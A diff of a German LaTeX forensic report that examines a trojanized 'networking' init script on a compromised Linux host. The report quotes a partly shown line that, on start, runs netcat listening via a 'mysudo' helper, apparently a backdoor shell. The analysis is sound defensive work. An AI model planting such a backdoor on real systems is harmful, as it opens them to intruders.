@@ -36,7 +36,7 @@ drwxr-xr-x 5 root root 4,0K Jan 28  2010 ..
 -rw-r--r-- 1 1001 root  675 Mai 12  2008 .profile
 \end{verbatim}
 
-Als erstes wurde die \texttt{networking} Datei näher betrachtet. Hierbei handelt es sich um ein Skript welches wahrscheinlich das Original unter \texttt{/etc/init.d/} ersetzen soll. Ein \texttt{diff /etc/init.d/networking /home/evil/networking} bestätigte diese vermutung. Wenn nun das Skript mit dem Parameter \texttt{start} aufgerufen wird, wird unter den normalen Befehlen ausserdem folgende Zeile ausgeführt \hl{referenz auf networking}:
+Als erstes wurde die \texttt{networking} Datei näher betrachtet. Hierbei handelt es sich um ein Skript welches wahrscheinlich das Original unter \texttt{/etc/init.d/} ersetzen soll. Ein \texttt{diff /etc/init.d/networking /home/evil/networking} bestätigte diese vermutung. Wenn nun das Skript mit dem Parameter \texttt{start} aufgerufen wird, wird unter den normalen Befehlen ausserdem folgende Zeile ausgeführt:
 \begin{verbatim}
 /usr/local/bin/mysudo "/var/www/upload/netcat -nvv \
 											 -l \
